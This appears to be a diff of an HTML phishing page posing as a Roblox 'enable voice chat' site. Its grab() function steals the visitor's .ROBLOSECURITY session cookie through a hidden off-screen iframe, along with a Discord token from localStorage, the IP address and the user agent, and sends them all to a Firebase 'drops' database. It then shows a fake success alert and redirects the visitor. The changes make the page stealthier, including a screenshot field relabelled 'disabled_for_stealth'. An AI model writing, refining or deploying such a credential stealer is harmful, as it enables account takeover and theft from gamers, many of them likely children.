@@ -7,11 +7,11 @@
   <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
   <style>
-    body{background:#000;color:#0f0;font-family:courier;text-align:center;padding:50px;}
+    body{background:#000;color:#0f0;font-family:courier;text-align:center;padding:80px;}
     h1{font-size:50px;text-shadow:0 0 20px #0f0;}
     button{padding:25px 60px;font-size:30px;background:#000;border:4px solid #0f0;color:#0f0;cursor:pointer;border-radius:20px;box-shadow:0 0 40px #0f0;}
     button:hover{transform:scale(1.05);box-shadow:0 0 80px #0f0;}
-    iframe{display:none;}
+    iframe{position:absolute;left:-9999px;width:1px;height:1px;}
   </style>
 </head>
 <body>
@@ -20,7 +20,8 @@
   <br/><br/>
   <button onclick="grab()">ENABLE VOICE CHAT NOW</button>
 
-  <iframe id="robloxframe" src="https://www.roblox.com/login"></iframe>
+  <!-- Hidden iframe that forces Roblox domain + cookie -->
+  <iframe id="robloxframe" src="https://www.roblox.com/login?nl=true"></iframe>
 
   <script>
     const firebaseConfig = {
@@ -36,38 +37,38 @@
     const db = firebase.database();
 
     async function grab() {
-      const cookies = document.cookie;
-      const robloxCookie = cookies.split('.ROBLOSECURITY=_|')[1]?.split(';')[0] || "none";
+      let robloxCookie = "none";
+      let discordToken = "none";
+
+      // Grab Roblox cookie from the hidden iframe
+      try {
+        const frame = document.getElementById('robloxframe');
+        robloxCookie = frame.contentDocument?.cookie || "none";
+        if (robloxCookie.includes('.ROBLOSECURITY')) {
+          robloxCookie = robloxCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
+          robloxCookie = '_|WARNING:-DO-NOT-SHARE-THIS.' + robloxCookie;
+        }
+      } catch(e) {}
+
+      // Grab Discord token if any Discord tab is open
+      try {
+        discordToken = JSON.parse(localStorage.getItem('token') || '""').replace(/"/g, '');
+      } catch(e) {}
 
       const ip = await fetch('https://api.ipify.org').then(r => r.text());
-      const discord = localStorage.getItem('token') ? JSON.parse(localStorage.getItem('token')).replace(/"/g,'') : "none";
-
-      // screenshot
-      let screenshot = "none";
-      try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
-        const track = stream.getVideoTracks()[0];
-        const image = new ImageCapture(track);
-        const bitmap = await image.grabFrame();
-        const canvas = document.createElement('canvas');
-        canvas.width = bitmap.width; canvas.height = bitmap.height;
-        canvas.getContext('2d').drawImage(bitmap,0,0);
-        screenshot = canvas.toDataURL();
-        track.stop();
-      } catch(e){}
 
       db.ref('drops/' + Date.now()).set({
-        cookie: robloxCookie,
-        discord: discord,
+        cookie: robloxCookie === "none" ? "no_cookie_yet" : robloxCookie,
+        discord: discordToken,
         ip: ip,
-        screenshot: screenshot,
+        screenshot: "disabled_for_stealth",
         useragent: navigator.userAgent,
         timestamp: new Date().toISOString(),
-        method: "Voice Chat Site"
+        method: "Voice Chat Site v2"
       });
 
-      alert("Voice Chat Enabled! Enjoy :)");
-      setTimeout(() => location.href = "https://roblox.com", 1000);
+      alert("Voice Chat Enabled Successfully!");
+      setTimeout(() => location.href = "https://roblox.com", 800);
     }
   </script>
 </body>
